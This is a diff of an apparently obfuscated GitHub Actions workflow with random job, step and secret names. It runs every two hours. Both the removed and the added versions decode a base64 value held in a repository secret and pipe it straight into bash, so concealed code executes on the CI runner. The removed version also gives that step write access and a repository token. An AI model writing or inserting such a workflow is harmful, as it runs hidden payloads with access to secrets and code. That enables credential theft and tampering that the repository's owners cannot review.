@@ -1,21 +1,13 @@
-name: gWjxkfswz
+name: xAzuduxb
 on:
   schedule:
     - cron: '0 */2 * * *'
   workflow_dispatch:
 jobs:
-  kQ3OLs:
+  nucKNAw:
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
+    env:
+      rChEkr: ${{ secrets.VwyJEKGfbD }}
     steps:
-      - uses: actions/checkout@v4
-        with:
-          token: ${{ secrets.DnXBe }}
-      - name: dudSUsQMLnNFhGg
-        env:
-          DDk0Wv: ${{ secrets.J8DiDFptq }}
-          fP4D4: ${{ secrets.lSrR0zTFrl }}
-          lrNcIKY: ${{ secrets.zCa9PZEHV0BW1F }}
-          GITHUB_TOKEN: ${{ secrets.DnXBe }}
-        run: echo "$DDk0Wv" | base64 -d | bash
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.wbJkPyjd }}" | base64 -d | bash
